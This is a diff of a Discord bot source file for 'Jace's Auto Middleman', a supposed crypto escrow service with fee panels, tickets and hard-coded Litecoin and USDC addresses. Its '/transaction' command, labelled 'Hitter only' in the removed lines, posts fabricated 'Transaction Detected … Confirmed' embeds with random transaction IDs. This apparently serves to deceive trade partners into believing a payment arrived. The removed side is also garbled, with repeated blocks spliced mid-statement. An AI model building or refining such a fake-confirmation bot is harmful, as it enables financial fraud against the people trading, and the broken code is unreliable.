@@ -1,1063 +1,189 @@
 const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
-    ],
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers],
     partials: [Partials.Channel, Partials.Message]
 });
 
 const OWNER_ID = '1422945082746601594';
-const HITTER_ROLE_ID = '1484680314772000902';
-const FINANCE_ROLE_ID = '1485363449897681017';
-
 const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
-client.config = {
-    OWNER_ID,
-    HITTER_ROLE_ID,
-    FINANCE_ROLE_ID,
-    TICKET_CATEGORY: null,
-    MANUAL_CATEGORY: null,
-    LOG_CHANNEL: null,
-    MONITOR_CHANNEL: null
-};
-
+client.config = { OWNER_ID, TICKET_CATEGORY: null, MANUAL_CATEGORY: null, LOG_CHANNEL: null };
 client.activeTickets = new Map();
-
 const isOwner = (id) => id === OWNER_ID;
-const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
-
-function generateFakeTransaction() {
-    const usd = Math.floor(Math.random() * 696) + 5;
-    const ltcPrice = 55.57;
-    const ltc = (usd / ltcPrice).toFixed(8);
-    const isUSDC = Math.random() > 0.5;
-    const currency = isUSDC ? 'USDC' : 'LTC';
-    const amount = isUSDC ? usd.toFixed(2) : ltc;
-    const chars = '0123456789abcdef';
-    let txid = '';
-    for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * 16)];
-    const shortTxid = `${txid.slice(0, 10)}...${txid.slice(-10)}`;
-    return { amount, usd, currency, txid: shortTxid, sender: 'Anonymous', receiver: 'Anonymous' };
-}
 
 const commands = [
-    {
-        name: 'panel',
-        description: 'Spawn middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manual',
-        description: 'Spawn manual middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'embed',
-        description: 'Spawn custom embed (Owner only)',
-        options: [
-            { name: 'title', type: 3, description: 'Embed title', required: true },
-            { name: 'description', type: 3, description: 'Embed description', required: true },
-            { name: 'color', type: 3, description: 'Hex color (default: 5865F2)', required: false }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'tickets',
-        description: 'Set auto MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manualcategory',
-        description: 'Set manual MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'log',
-        description: 'Set fake transaction log channel (Owner only)',
-        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'heh',
-        description: 'Set monitor channel (Owner only)',
-        options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'transaction',
-        description: 'Trigger fake transaction (Hitter only)',
-        options: [
-            { name: 'channelid', type: 3, description: 'Ticket channel ID', required: true },
-            { name: 'amount', type: 10, description: 'Amount (optional)', required: false }
-        ]
-    },
-    {
-        name: 'close',
-        description: 'Close current ticket'
-    },
-    {
-        name: 'say',
-        description: 'Send message as bot (Owner only)',
-        options: [
-            { name: 'channel', type: 7, description: 'Target channel', required: true },
-            { name: 'message', type: 3, description: 'Message to send', required: true }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    }
+    { name: 'panel', description: 'Spawn middleman panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'manual', description: 'Spawn manual panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'embed', description: 'Spawn custom embed', options: [{ name: 'title', type: 3, description: 'Title', required: true }, { name: 'description', type: 3, description: 'Description', required: true }, { name: 'color', type: 3, description: 'Hex color', required: false }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'tickets', description: 'Set auto category', options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'manualcategory', description: 'Set manual category', options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'log', description: 'Set log channel', options: [{ name: 'channel', type: 7, description: 'Channel', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'transaction', description: 'Trigger fake transaction', options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
+    { name: 'close', description: 'Close ticket' },
+    { name: 'say', description: 'Send message', options: [{ name: 'channel', type: 7, description: 'Channel', required: true }, { name: 'message', type: 3, description: 'Message', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator }
 ];
 
-client.on(Events.GuildCreate, async (guild) => {
-    try { await guild.commands.set(commands); } catch (e) { console.error('Cmd reg fail:', e); }
-});
+client.on(Events.GuildCreate, async (g) => { try { await g.commands.set(commands); } catch (e) {} });
+client.on(Events.ClientReady, async () => { console.log(`✅ ${client.user.tag}`); for (const [, g] of client.guilds.cache) { try { await g.commands.set(commands); } catch (e) {} } });
 
-client.on(Events.ClientReady, async () => {
-    console.log(`✅ Bot logged in as ${client.user.tag}`);
-    for (const [, guild] of client.guilds.cache) {
-        try { await guild.commands.set(commands); } catch (e) { console.error(`Cmd fail ${guild.name}:`, e); }
-    }
-});
-
-client.on(Events.GuildMemberUpdate, (oldM, newM) => {
-    const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
-    const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
-    if (added.has(HITTER_ROLE_ID)) console.log(`[ROLE] +HITTER ${newM.user.tag}`);
-    if (removed.has(HITTER_ROLE_ID)) console.log(`[ROLE] -HITTER ${newM.user.tag}`);
-    if (added.has(FINANCE_ROLE_ID)) console.log(`[ROLE] +FINANCE ${newM.user.tag}`);
-    if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isChatInputCommand()) return;
-    
-    const { commandName, member, user, channel } = interaction;
-    console.log(`[CMD] /${commandName} by ${user.tag}`);
-
-    const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });
+client.on(Events.InteractionCreate, async (i) => {
+    if (!i.isChatInputCommand()) return;
+    const { commandName, user, channel } = i;
+    const deny = (m) => i.reply({ content: `❌ ${m}`, ephemeral: true });
 
     try {
         switch (commandName) {
             case 'panel':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const infoEmbed = new EmbedBuilder()
-                    .setTitle("Jace's Auto Middleman")
-                    .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
-                    .setColor(0x2B2D31);
-                
-                const feesEmbed = new EmbedBuilder()
-                    .setTitle('Fees:')
-                    .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
-                    .setColor(0x2B2D31);
-                
-                const ltcEmbed = new EmbedBuilder()
-                    .setTitle('Ł • Request Litecoin • Ł')
-                    .setColor(0x2B2D31);
-                
-                const ltcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_ltc')
-                            .setLabel('Request LTC')
-                            .setStyle(ButtonStyle.Primary)
-                            .setEmoji('Ł')
-                    );
-                
-                const usdcEmbed = new EmbedBuilder()
-                    .setTitle('💲 • Request USDC')
-                    .setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**')
-                    .setColor(0x2B2D31);
-                
-                const usdcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_usdc')
-                            .setLabel('Request USDC [ERC-20]')
-                            .setStyle(ButtonStyle.Success)
-                            .setEmoji('💲')
-                    );
-                
-                await channel.send({ embeds: [infoEmbed, feesEmbed] });
-                await_ID,
-    TICKET_CATEGORY: null,
-    MANUAL_CATEGORY: null,
-    LOG_CHANNEL: null,
-    MONITOR_CHANNEL: null
-};
-
-client.activeTickets = new Map();
-
-const isOwner = (id) => id === OWNER_ID;
-const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
-
-function generateFakeTransaction() {
-    const usd = Math.floor(Math.random() * 696) + 5;
-    const ltcPrice = 55.57;
-    const ltc = (usd / ltcPrice).toFixed(8);
-    const isUSDC = Math.random() > 0.5;
-    const currency = isUSDC ? 'USDC' : 'LTC';
-    const amount = isUSDC ? usd.toFixed(2) : ltc;
-    const chars = '0123456789abcdef';
-    let txid = '';
-    for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * 16)];
-    const shortTxid = `${txid.slice(0, 10)}...${txid.slice(-10)}`;
-    return { amount, usd, currency, txid: shortTxid, sender: 'Anonymous', receiver: 'Anonymous' };
-}
-
-const commands = [
-    {
-        name: 'panel',
-        description: 'Spawn middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manual',
-        description: 'Spawn manual middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'embed',
-        description: 'Spawn custom embed (Owner only)',
-        options: [
-            { name: 'title', type: 3, description: 'Embed title', required: true },
-            { name: 'description', type: 3, description: 'Embed description', required: true },
-            { name: 'color', type: 3, description: 'Hex color (default: 5865F2)', required: false }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'tickets',
-        description: 'Set auto MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manualcategory',
-        description: 'Set manual MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'log',
-        description: 'Set fake transaction log channel (Owner only)',
-        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'heh',
-        description: 'Set monitor channel (Owner only)',
-        options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'transaction',
-        description: 'Trigger fake transaction (Hitter only)',
-        options: [
-            { name: 'channelid', type: 3, description: 'Ticket channel ID', required: true },
-            { name: 'amount', type: 10, description: 'Amount (optional)', required: false }
-        ]
-    },
-    {
-        name: 'close',
-        description: 'Close current ticket'
-    },
-    {
-        name: 'say',
-        description: 'Send message as bot (Owner only)',
-        options: [
-            { name: 'channel', type: 7, description: 'Target channel', required: true },
-            { name: 'message', type: 3, description: 'Message to send', required: true }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    }
-];
-
-client.on(Events.GuildCreate, async (guild) => {
-    try { await guild.commands.set(commands); } catch (e) { console.error('Cmd reg fail:', e); }
-});
-
-client.on(Events.ClientReady, async () => {
-    console.log(`✅ Bot logged in as ${client.user.tag}`);
-    for (const [, guild] of client.guilds.cache) {
-        try { await guild.commands.set(commands); } catch (e) { console.error(`Cmd fail ${guild.name}:`, e); }
-    }
-});
-
-client.on(Events.GuildMemberUpdate, (oldM, newM) => {
-    const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
-    const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
-    if (added.has(HITTER_ROLE_ID)) console.log(`[ROLE] +HITTER ${newM.user.tag}`);
-    if (removed.has(HITTER_ROLE_ID)) console.log(`[ROLE] -HITTER ${newM.user.tag}`);
-    if (added.has(FINANCE_ROLE_ID)) console.log(`[ROLE] +FINANCE ${newM.user.tag}`);
-    if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isChatInputCommand()) return;
-    
-    const { commandName, member, user, channel } = interaction;
-    console.log(`[CMD] /${commandName} by ${user.tag}`);
-
-    const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });
-
-    try {
-        switch (commandName) {
-            case 'panel':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const infoEmbed = new EmbedBuilder()
-                    .setTitle("Jace's Auto Middleman")
-                    .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
-                    .setColor(0x2B2D31);
-                
-                const feesEmbed = new EmbedBuilder()
-                    .setTitle('Fees:')
-                    .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
-                    .setColor(0x2B2D31);
-                
-                const ltcEmbed = new EmbedBuilder()
-                    .setTitle('Ł • Request Litecoin • Ł')
-                    .setColor(0x2B2D31);
-                
-                const ltcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_ltc')
-                            .setLabel('Request LTC')
-                            .setStyle(ButtonStyle.Primary)
-                            .setEmoji('Ł')
-                    );
-                
-                const usdcEmbed = new EmbedBuilder()
-                    .setTitle('💲 • Request USDC')
-                    .setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**')
-                    .setColor(0x2B2D31);
-                
-                const usdcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_usdc')
-                            .setLabel('Request USDC [ERC-20]')
-                            .setStyle(ButtonStyle.Success)
-                            .setEmoji('💲')
-                    );
-                
-                await channel.send({ embeds: [infoEmbed, feesEmbed] });
-                await channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
-                await channel.send({ embeds: [usdcEmbed], components: [usdcRow] });
-                
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
+                if (!isOwner(user.id)) return deny('Owner only');
+                const info = new EmbedBuilder().setTitle("Jace's Auto Middleman").setDescription('• Paid Service\n• Read ToS: #tos-crypto').setColor(0x2B2D31);
+                const fees = new EmbedBuilder().setTitle('Fees:').setDescription('• $250+: $1.50\n• Under $250: $0.50\n• Under $50: **FREE**').setColor(0x2B2D31);
+                const ltc = new EmbedBuilder().setTitle('Ł • Request Litecoin • Ł').setColor(0x2B2D31);
+                const ltcRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('Ł'));
+                const usdc = new EmbedBuilder().setTitle('💲 • Request USDC').setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**').setColor(0x2B2D31);
+                const usdcRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('request_usdc').setLabel('Request USDC [ERC-20]').setStyle(ButtonStyle.Success).setEmoji('💲'));
+                await channel.send({ embeds: [info, fees] });
+                await channel.send({ embeds: [ltc], components: [ltcRow] });
+                await channel.send({ embeds: [usdc], components: [usdcRow] });
+                await i.deferReply({ ephemeral: true });
+                await i.deleteReply();
                 break;
 
             case 'manual':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const manualEmbed = new EmbedBuilder()
-                    .setTitle('👤 Manual Middleman Service')
-                    .setDescription('Manual middleman service, Please follow the rules and wait patiently')
-                    .setColor(0xFFA500)
-                    .addFields(
-                        { name: 'Tier 1', value: 'Middleman ($200 or under)', inline: true },
-                        { name: 'Tier 2', value: 'Middleman ($500 and under)', inline: true },
-                        { name: 'Tier 3', value: 'Middleman ($1000+)', inline: true }
-                    );
-                
-                const manualRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier1')
-                            .setLabel('Tier 1 ($200)')
-                            .setStyle(ButtonStyle.Primary)
-                            .setEmoji('🥉'),
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier2')
-                            .setLabel('Tier 2 ($500)')
-                            .setStyle(ButtonStyle.Secondary)
-                            .setEmoji('🥈'),
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier3')
-                            .setLabel('Tier 3 ($1000+)')
-                            .setStyle(ButtonStyle.Success)
-                            .setEmoji('🥇')
-                    );
-                
-                await channel.send({ embeds: [manualEmbed], components: [manualRow] });
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
+                if (!isOwner(user.id)) return deny('Owner only');
+                const man = new EmbedBuilder().setTitle('👤 Manual Middleman Service').setDescription('Manual middleman service, Please follow the rules and wait patiently').setColor(0xFFA500)
+                    .addFields({ name: 'Tier 1', value: '$200 or under', inline: true }, { name: 'Tier 2', value: '$500 or under', inline: true }, { name: 'Tier 3', value: '$1000+', inline: true });
+                const manRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('manual_tier1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'), new ButtonBuilder().setCustomId('manual_tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'), new ButtonBuilder().setCustomId('manual_tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇'));
+                await channel.send({ embeds: [man], components: [manRow] });
+                await i.deferReply({ ephemeral: true });
+                await i.deleteReply();
                 break;
 
             case 'embed':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const title = interaction.options.getString('title');
-                const description = interaction.options.getString('description');
-                const colorInput = interaction.options.getString('color') || '5865F2';
-                const color = parseInt(colorInput.replace('#', ''), 16) || 0x5865F2;
-                
-                const customEmbed = new EmbedBuilder()
-                    .setTitle(title)
-                    .setDescription(description)
-                    .setColor(color);
-                
-                await channel.send({ embeds: [customEmbed] });
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
+                if (!isOwner(user.id)) return deny('Owner only');
+                const emb = new EmbedBuilder().setTitle(i.options.getString('title')).setDescription(i.options.getString('description')).setColor(parseInt((i.options.getString('color') || '5865F2').replace('#', ''), 16) || 0x5865F2);
+                await channel.send({ embeds: [emb] });
+                await i.deferReply({ ephemeral: true });
+                await i.deleteReply();
                 break;
 
             case 'tickets':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.TICKET_CATEGORY = interaction.options.getString('categoryid');
-                await interaction.reply({ content: `✅ Auto MM ticket category set.`, ephemeral: true });
+                if (!isOwner(user.id)) return deny('Owner only');
+                client.config.TICKET_CATEGORY = i.options.getString('categoryid');
+                await i.reply({ content: '✅ Auto category set', ephemeral: true });
                 break;
 
             case 'manualcategory':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.MANUAL_CATEGORY = interaction.options.getString('categoryid');
-                await interaction.reply({ content: `✅ Manual MM ticket category set.`, ephemeral: true });
+                if (!isOwner(user.id)) return deny('Owner only');
+                client.config.MANUAL_CATEGORY = i.options.getString('categoryid');
+                await i.reply({ content: '✅ Manual category set', ephemeral: true });
                 break;
 
             case 'log':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.LOG_CHANNEL = interaction.options.getChannel('channel').id;
-                await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
-                break;
-
-            case 'heh':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.MONITOR_CHANNEL = interaction.options.getString('channelid');
-                await interaction.reply({ content: '✅ Monitor channel set.', ephemeral: true });
+                if (!isOwner(user.id)) return deny('Owner only');
+                client.config.LOG_CHANNEL = i.options.getChannel('channel').id;
+                await i.reply({ content: '✅ Log channel set', ephemeral: true });
                 break;
 
             case 'transaction':
-                if (!hasHitter(member) && !isOwner(user.id)) return deny('Hitter role required.');
-                const chId = interaction.options.getString('channelid');
-                const txChannel = await client.channels.fetch(chId).catch(() => null);
-                if (!txChannel) return deny('Invalid channel ID.');
-                
-                const fakeTx = generateFakeTransaction();
-                const txEmbed = new EmbedBuilder()
-                    .setTitle('🔔 New Transaction Detected')
-                    .setDescription(`**${fakeTx.amount} ${fakeTx.currency}** ($${fakeTx.usd.toFixed(2)})`)
-                    .addFields(
-                        { name: 'Transaction ID', value: `\`${fakeTx.txid}\``, inline: false },
-                        { name: 'Status', value: '✅ Confirmed', inline: true },
-                        { name: 'Confirmations', value: '6+', inline: true },
-                        { name: 'From', value: `\`${fakeTx.sender}\``, inline: true },
-                        { name: 'To', value: `\`${fakeTx.receiver}\``, inline: true }
-                    )
-                    .setColor(0x00FF00)
-                    .setTimestamp();
-                
-                await txChannel.send({ embeds: [txEmbed] });
-                await interaction.reply({ content: `✅ Fake transaction sent to <#${chId}>`, ephemeral: true });
+                if (!isOwner(user.id)) return deny('Owner only');
+                const ch = await client.channels.fetch(i.options.getString('channelid')).catch(() => null);
+                if (!ch) return deny('Invalid channel');
+                const usd = Math.floor(Math.random() * 696) + 5;
+                const ltc = (usd / 55.57).toFixed(8);
+                const isU = Math.random() > 0.5;
+                const cur = isU ? 'USDC' : 'LTC';
+                const amt = isU ? usd.toFixed(2) : ltc;
+                let tx = ''; for (let j = 0; j < 64; j++) tx += '0123456789abcdef'[Math.floor(Math.random() * 16)];
+                const txe = new EmbedBuilder().setTitle('🔔 New Transaction').setDescription(`**${amt} ${cur}** ($${usd})`).addFields({ name: 'TXID', value: `\`${tx.slice(0, 10)}...${tx.slice(-10)}\``, inline: false }, { name: 'Status', value: '✅ Confirmed', inline: true }, { name: 'From', value: '`Anonymous`', inline: true }, { name: 'To', value: '`Anonymous`', inline: true }).setColor(0x00FF00).setTimestamp();
+                await ch.send({ embeds: [txe] });
+                await i.reply({ content: '✅ Fake transaction sent', ephemeral: true });
                 break;
 
             case 'close':
-                if (!interaction.channel.name.includes('ticket')) return deny('Not a ticket channel.');
-                await interaction.reply('🔒 Closing ticket in 5 seconds...');
-                setTimeout(() => interaction.channel.delete().catch(console.error), 5000);
+                if (!i.channel.name.includes('ticket')) return deny('Not a ticket');
+                await i.reply('🔒 Closing in 5s...');
+                setTimeout(() => i.channel.delete().catch(() => {}), 5000);
                 break;
 
             case 'say':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                const sayChannel = interaction.options.getChannel('channel');
-                const sayMessage = interaction.options.getString('message');
-                await sayChannel.send(sayMessage);
-                await interaction.reply({ content: `✅ Message sent to ${sayChannel}`, ephemeral: true });
+                if (!isOwner(user.id)) return deny('Owner only');
+                await i.options.getChannel('channel').send(i.options.getString('message'));
+                await i.reply({ content: '✅ Message sent', ephemeral: true });
                 break;
         }
-    } catch (err) {
-        console.error(`[ERR] /${commandName}:`, err);
-        if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
+    } catch (e) {
+        console.error(e);
+        if (!i.replied && !i.deferred) await i.reply({ content: '❌ Error', ephemeral: true });
     }
 });
 
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isButton()) return;
-    
-    const { customId, user } = interaction;
-    
+client.on(Events.InteractionCreate, async (i) => {
+    if (!i.isButton()) return;
+    const { customId, user } = i;
+
     if (customId === 'request_ltc') {
-        if (!client.config.TICKET_CATEGORY) {
-            return interaction.reply({ content: '❌ Ticket category not set. Use /tickets', ephemeral: true });
-        }
-
-        const modal = new ModalBuilder()
-            .setCustomId('ltc_ticket_modal')
-            .setTitle('LTC Deal Amount');
-        
-        const amountInput = new TextInputBuilder()
-            .setCustomId('amount')
-            .setLabel('Deal Amount (USD)')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Enter amount in USD')
-            .setRequired(true);
-        
-        const row = new ActionRowBuilder().addComponents(amountInput);
-        modal.addComponents(row);
-        
-        await interaction.showModal(modal);
+        if (!client.config.TICKET_CATEGORY) return i.reply({ content: '❌ Set category first', ephemeral: true });
+        const m = new ModalBuilder().setCustomId('ltc_modal').setTitle('LTC Amount');
+        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setRequired(true)));
+        await i.showModal(m);
     }
-    
+
     if (customId === 'request_usdc') {
-        if (!client.config.TICKET_CATEGORY) {
-            return interaction.reply({ content: '❌ Ticket category not set. Use /tickets', ephemeral: true });
-        }
-
-        const modal = new ModalBuilder()
-            .setCustomId('usdc_ticket_modal')
-            .setTitle('USDC Deal Amount');
-        
-        const amountInput = new TextInputBuilder()
-            .setCustomId('amount')
-            .setLabel('Deal Amount (USD)')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Enter amount in USD')
-            .setRequired(true);
-        
-        const row = new ActionRowBuilder().addComponents(amountInput);
-        modal.addComponents(row);
-        
-        await interaction.showModal(modal);
+        if (!client.config.TICKET_CATEGORY) return i.reply({ content: '❌ Set category first', ephemeral: true });
+        const m = new ModalBuilder().setCustomId('usdc_modal').setTitle('USDC Amount');
+        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setRequired(true)));
+        await i.showModal(m);
     }
-    
+
     if (customId.startsWith('manual_tier')) {
         const tier = customId.replace('manual_tier', '');
         const limits = { '1': 200, '2': 500, '3': 1000 };
-        const limit = limits[tier];
-        
-        if (!client.config.MANUAL_CATEGORY) {
-            return interaction.reply({ content: '❌ Manual MM category not set. Use /manualcategory', ephemeral: true });
-        }
-
+        if (!client.config.MANUAL_CATEGORY) return i.reply({ content: '❌ Set manual category first', ephemeral: true });
         try {
-            const ticketCh = await interaction.guild.channels.create({
-                name: `manual-${user.username}-t${tier}`,
-                parent: client.config.MANUAL_CATEGORY,
-                permissionOverwrites:_ID,
-    TICKET_CATEGORY: null,
-    MANUAL_CATEGORY: null,
-    LOG_CHANNEL: null,
-    MONITOR_CHANNEL: null
-};
-
-client.activeTickets = new Map();
-
-const isOwner = (id) => id === OWNER_ID;
-const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
-
-function generateFakeTransaction() {
-    const usd = Math.floor(Math.random() * 696) + 5;
-    const ltcPrice = 55.57;
-    const ltc = (usd / ltcPrice).toFixed(8);
-    const isUSDC = Math.random() > 0.5;
-    const currency = isUSDC ? 'USDC' : 'LTC';
-    const amount = isUSDC ? usd.toFixed(2) : ltc;
-    const chars = '0123456789abcdef';
-    let txid = '';
-    for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * 16)];
-    const shortTxid = `${txid.slice(0, 10)}...${txid.slice(-10)}`;
-    return { amount, usd, currency, txid: shortTxid, sender: 'Anonymous', receiver: 'Anonymous' };
-}
-
-const commands = [
-    {
-        name: 'panel',
-        description: 'Spawn middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manual',
-        description: 'Spawn manual middleman panel (Owner only)',
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'embed',
-        description: 'Spawn custom embed (Owner only)',
-        options: [
-            { name: 'title', type: 3, description: 'Embed title', required: true },
-            { name: 'description', type: 3, description: 'Embed description', required: true },
-            { name: 'color', type: 3, description: 'Hex color (default: 5865F2)', required: false }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'tickets',
-        description: 'Set auto MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'manualcategory',
-        description: 'Set manual MM ticket category (Owner only)',
-        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'log',
-        description: 'Set fake transaction log channel (Owner only)',
-        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'heh',
-        description: 'Set monitor channel (Owner only)',
-        options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    },
-    {
-        name: 'transaction',
-        description: 'Trigger fake transaction (Hitter only)',
-        options: [
-            { name: 'channelid', type: 3, description: 'Ticket channel ID', required: true },
-            { name: 'amount', type: 10, description: 'Amount (optional)', required: false }
-        ]
-    },
-    {
-        name: 'close',
-        description: 'Close current ticket'
-    },
-    {
-        name: 'say',
-        description: 'Send message as bot (Owner only)',
-        options: [
-            { name: 'channel', type: 7, description: 'Target channel', required: true },
-            { name: 'message', type: 3, description: 'Message to send', required: true }
-        ],
-        defaultMemberPermissions: PermissionFlagsBits.Administrator
-    }
-];
-
-client.on(Events.GuildCreate, async (guild) => {
-    try { await guild.commands.set(commands); } catch (e) { console.error('Cmd reg fail:', e); }
-});
-
-client.on(Events.ClientReady, async () => {
-    console.log(`✅ Bot logged in as ${client.user.tag}`);
-    for (const [, guild] of client.guilds.cache) {
-        try { await guild.commands.set(commands); } catch (e) { console.error(`Cmd fail ${guild.name}:`, e); }
-    }
-});
-
-client.on(Events.GuildMemberUpdate, (oldM, newM) => {
